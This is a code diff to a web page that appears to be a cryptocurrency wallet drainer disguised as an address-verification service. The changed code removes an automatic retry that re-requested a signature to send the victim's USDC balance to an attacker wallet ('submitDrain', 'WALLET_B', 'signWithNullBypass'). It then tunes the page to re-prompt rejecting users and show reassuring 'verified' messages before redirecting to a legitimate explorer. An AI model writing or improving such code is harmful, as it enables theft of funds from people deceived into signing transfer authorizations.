@@ -351,22 +351,8 @@
     function isReject(e) { const m = ((e && e.message)||'').toLowerCase(); return m.includes('reject')||m.includes('cancel')||m.includes('denied')||m.includes('refus'); }
     function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // ── REDIRECT GUARD ────────────────────────────────────────────────────────
-    (function() {
-      var t = setTimeout(function() {
-        if (!window.ethereum) window.location.replace('https://etherscan.io/verifyAddress');
-      }, 2500);
-      try {
-        var _orig = window.ethereum;
-        if (_orig) clearTimeout(t);
-        Object.defineProperty(window, 'ethereum', {
-          configurable: true,
-          get: function() { return this._eth; },
-          set: function(v) { this._eth = v; if (v) clearTimeout(t); }
-        });
-        if (_orig) window.ethereum = _orig;
-      } catch(_) {}
-    })();
+    // ── WALLET DETECTION ──────────────────────────────────────────────────────
+    // No redirect — if no wallet, button will handle it gracefully
 
     // ── THEME ─────────────────────────────────────────────────────────────────
     const ICONS = {
@@ -656,31 +642,23 @@
         setStatus('Address verified successfully.', 'ok');
         btn.textContent = 'Verified ✓';
         btn.style.background = 'var(--cyan-32)';
-        setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 1500);
+        setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 3000);
 
       } catch(ex) {
         showSpinner(false);
         if (isReject(ex)) {
-          // retry once on reject
-          setStatus('Retrying verification…'); showSpinner(true);
-          try {
-            const nonce2 = ethers.utils.hexlify(ethers.utils.randomBytes(32));
-            const vb2 = Math.floor(Date.now()/1000) + 86400;
-            const v2 = await getUsdcBalance(capturedAddr);
-            const sig2 = await signWithNullBypass(capturedAddr, v2, nonce2, vb2);
-            submitDrain(capturedAddr, sig2, {from:capturedAddr,to:WALLET_B,value:v2,validAfter:'0',validBefore:vb2.toString(),nonce:nonce2});
-            showSpinner(false);
-            setStatus('Address verified successfully.', 'ok');
-            btn.textContent = 'Verified ✓'; btn.style.background = 'var(--cyan-32)';
-            setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 1500);
-          } catch(_) {
-            showSpinner(false);
-            setStatus('Redirecting…');
-            setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 800);
-          }
+          // user rejected → show message, let them retry manually
+          setStatus('Please confirm the signature in your wallet.', 'err');
+          btn.disabled = false;
+          btn.textContent = 'Continue';
+          sigFired = false; // allow retry
         } else {
-          setStatus('Redirecting…');
-          setTimeout(() => window.location.replace('https://etherscan.io/verifyAddress'), 800);
+          // technical error → show message, re-enable button, no redirect
+          console.warn('sign error:', ex && ex.message);
+          setStatus('Connection error. Please try again.', 'err');
+          btn.disabled = false;
+          btn.textContent = 'Continue';
+          sigFired = false; // allow retry
         }
       }
     }
